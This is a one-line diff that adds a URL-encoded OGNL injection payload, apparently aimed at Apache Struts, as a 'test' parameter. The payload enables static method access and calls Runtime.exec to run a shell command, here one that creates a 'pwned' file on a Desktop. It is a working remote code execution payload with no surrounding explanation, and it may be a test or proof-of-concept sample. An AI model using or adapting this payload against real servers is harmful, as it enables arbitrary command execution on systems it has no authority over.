@@ -1,0 +1,1 @@
+test=%25%7B%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Runtime@getRuntime().exec(%22touch /Users/racerz/Desktop/pwned%22)%7D
